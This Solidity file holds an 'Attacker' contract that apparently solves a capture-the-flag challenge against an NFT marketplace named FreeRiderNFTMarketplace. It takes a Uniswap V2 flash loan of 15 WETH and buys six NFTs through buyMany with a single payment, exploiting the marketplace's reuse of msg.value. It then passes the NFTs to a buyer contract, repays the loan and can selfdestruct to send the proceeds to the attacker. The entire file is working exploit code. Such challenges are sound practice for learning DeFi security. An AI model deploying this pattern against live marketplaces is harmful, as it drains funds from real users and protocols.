// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";

interface IUniswapV2Pair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address token0, address token1) external view returns (address);
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IWETH {
    function deposit() payable external;
    function withdraw(uint256 amount) external;
}

contract Attacker is IERC721Receiver, IUniswapV2Callee {

    using Address for address payable;
    address payable private immutable attacker;
    address private immutable buyer;
    IERC721 private immutable nft;
    IUniswapV2Pair private immutable pair;
    FreeRiderNFTMarketplace private immutable marketplace;

    constructor(address payable _attacker, address _buyer, address _nft, address _pair, address payable _marketplace) payable {
        attacker = _attacker;
        buyer = _buyer;
        nft = IERC721(_nft);
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // called by uniswapv2
    function uniswapV2Call(
        address _sender,
        uint _amount0,
        uint _amount1,
        bytes calldata _data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        require(msg.sender == address(pair));
        require(_sender == address(this));

        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));
        require(tokenBorrow == token0);

        IWETH(token0).withdraw(amount);

        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            ids[i] = i;
        }
        marketplace.buyMany{value: amount}(ids);
        require(address(this).balance >= amount);
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(nft.ownerOf(i), buyer, i);
        }

        // about 0.3%
        uint fee = ((amount * 3) / 997) + 1;
        uint amountToRepay = amount + fee;
        require(address(this).balance >= amountToRepay);

        IWETH(tokenBorrow).deposit{value: amountToRepay}();
        IERC20(tokenBorrow).transfer(address(pair), amountToRepay);
    }

    function attack() external {
        require(msg.sender == attacker);
        address token0 = pair.token0();
        uint256 amount = 15 ether;
        uint amount0Out = amount;
        uint amount1Out = 0;

        bytes memory data = abi.encode(token0, amount);

        // lend WETH from uniswapv2 pair
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        require(msg.sender == address(nft));

        return IERC721Receiver.onERC721Received.selector;
    }

    function destroy() external {
        require(msg.sender == attacker);
        selfdestruct(attacker);
    }

    receive() external payable {}
}
